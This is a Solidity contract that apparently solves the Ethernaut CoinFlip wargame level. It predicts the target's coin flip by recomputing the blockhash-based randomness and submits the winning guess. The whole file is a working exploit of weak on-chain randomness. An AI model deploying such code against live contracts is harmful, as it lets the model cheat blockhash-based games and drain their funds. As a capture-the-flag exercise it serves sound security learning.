// SPDX-License-Identifier: MIT
pragma solidity 0.8.30;

interface ICoinFlip {
    function flip(bool) external returns (bool);
}

contract Solve {
    address target;
    uint256 lastHash;
    uint256 FACTOR = 57896044618658097711785492504343953926634992332820282019728792003956564819968;

    constructor(address _target) {
        target = _target;
    }

    // Key Importance: block.number always fix in same transaction
    function solve() public {
        uint256 blockValue;
        uint256 coinFlip;
        bool side;

        blockValue = uint256(blockhash(block.number - 1));

        if (lastHash == blockValue)
            revert();

        lastHash = blockValue;
        coinFlip = blockValue / FACTOR;
        side = coinFlip == 1 ? true : false;

        ICoinFlip(target).flip(side);
    }
}